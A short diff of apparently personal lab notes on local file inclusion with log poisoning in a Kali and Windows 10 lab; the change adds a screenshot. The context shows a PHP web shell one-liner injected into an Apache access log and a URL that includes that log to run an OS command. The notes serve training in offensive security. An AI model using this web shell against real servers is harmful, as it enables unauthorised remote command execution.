@@ -63,6 +63,8 @@ _(To be performed on your own Kali and Windows 10 lab client machines - Reportin
 - First, we make a malicious request to the server, injecting a PHP function that will execute the OS command
 `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`
 (note the `<pre>` tag meaning the line will be saved in its preformatted state, ignore breaks and spaces)
+![[Screenshot_2022-06-09-10-38-40_432x85.png]]
+
 - We then simply navigate to the vulnerable URL and call our newly injected function
 `http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`
 
